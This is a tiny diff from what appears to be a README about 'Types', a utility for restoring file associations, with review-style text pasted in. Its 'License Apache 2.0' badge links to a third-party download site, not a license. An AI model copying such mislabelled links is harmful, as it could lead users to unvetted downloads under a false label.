@@ -16,3 +16,4 @@ On the downside, the program is not very easy to use and doesn't include any doc
 Types can help you restore broken file associations in your system, though it may not be easy to use for a beginner.
 
 ## [![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://filecroco.co/ddl/)
+
